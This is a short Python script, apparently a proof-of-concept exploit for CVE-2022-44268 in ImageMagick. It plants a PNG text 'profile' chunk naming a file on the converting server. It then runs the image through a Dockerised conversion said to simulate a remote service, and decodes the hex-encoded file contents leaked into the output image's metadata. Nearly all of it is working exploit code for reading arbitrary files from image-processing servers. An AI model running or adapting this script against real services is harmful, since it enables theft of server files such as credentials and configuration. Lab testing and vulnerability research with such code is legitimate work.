#! /usr/bin/env python3

import png
import sys
import os
import re

def insert_text_chunk(target, desired):
    text = f'profile\x00{desired}'
    reader = png.Reader(filename=target)
    chunks = list(reader.chunks())
    chunks.insert(1, (b'tEXt', bytes(text, 'utf-8')))
    with open('mod.png', 'wb') as dst:
        png.write_chunks(dst, chunks)

if __name__ == '__main__':
    # Get Arguments
    if len(sys.argv) != 3:
        print("Usage: ./e.py <png filename> <desired file>")
        exit(0)
    else:
        target_file = sys.argv[1]
        desired_file = sys.argv[2]
    
    # make temporary "mod.png" file with profile added
    insert_text_chunk(target_file, desired_file)


    # Run the conversion (this docker container simulates a remote file conversion
    os.system("docker run -it -v $(pwd):/w cve-2022-44268:v51 /w/mod.png -resize 100x100 /w/extract.png")

    # Pull the chunk info from the converted file
    os.system("identify -verbose ./extract.png > info.txt")

    # Extract the file data. This should pull all the data and save it to the filename that you specified in the beginning.
    with open('info.txt', 'r') as info:
        stuff = info.read()
        match = re.search(r"Raw profile type:\s+(.*?)\s+signature:", stuff, re.S)
        if match:
            extracted_section = match.group(1).split('\n')
            file_contents = []
            for line in extracted_section[1:]:
                file_contents.append(bytes.fromhex(line).decode('utf-8'))
            file_name = sys.argv[2].split('/')[-1]
            with open(file_name, 'w') as f:
                f.writelines(file_contents)
        else:
            print("No match found. Exploit failed.")
        
    # Remove Unneeded files
    os.remove('info.txt')
    os.remove('extract.png')
    os.remove('mod.png')
